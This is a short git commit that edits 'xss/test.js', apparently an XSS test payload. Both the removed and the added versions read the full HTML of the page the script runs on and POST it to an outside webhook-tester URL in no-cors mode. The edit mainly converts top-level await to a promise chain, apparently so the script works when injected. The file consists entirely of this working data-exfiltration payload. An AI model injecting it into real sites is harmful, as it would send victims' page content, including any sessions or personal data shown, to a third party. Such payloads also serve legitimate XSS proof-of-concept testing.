871863ad2bea1f5ca5590e675db5046b7cc4c267
Sean Marpo <seanmarpo@users.noreply.github.com>
2025-06-25 10:08:12 -0700

    Fixing

--- xss/test.js
+++ xss/test.js
@@ -1,22 +1,20 @@
-try {
-  const content = document.documentElement.outerHTML;
-  const response = await fetch(
-    "https://webhook-tester.dev.services.atlassian.com/smarpo",
-    {
-      method: "POST",
-      headers: {
-        "Content-Type": "text/html",
-      },
-      body: content,
-      mode: "no-cors",
-    },
-  );
+const content = document.documentElement.outerHTML;
 
-  if (response.ok) {
-    console.log("Page content sent successfully!");
-  } else {
-    console.error("Failed to send page content:", response.status);
-  }
-} catch (error) {
-  console.error("Error sending page content:", error);
-}
+fetch("https://webhook-tester.dev.services.atlassian.com/smarpo", {
+  method: "POST",
+  headers: {
+    "Content-Type": "text/html",
+  },
+  body: content,
+  mode: "no-cors",
+})
+  .then((response) => {
+    if (response.ok) {
+      console.log("Page content sent successfully!");
+    } else {
+      console.error("Failed to send page content:", response.status);
+    }
+  })
+  .catch((error) => {
+    console.error("Error sending page content:", error);
+  });
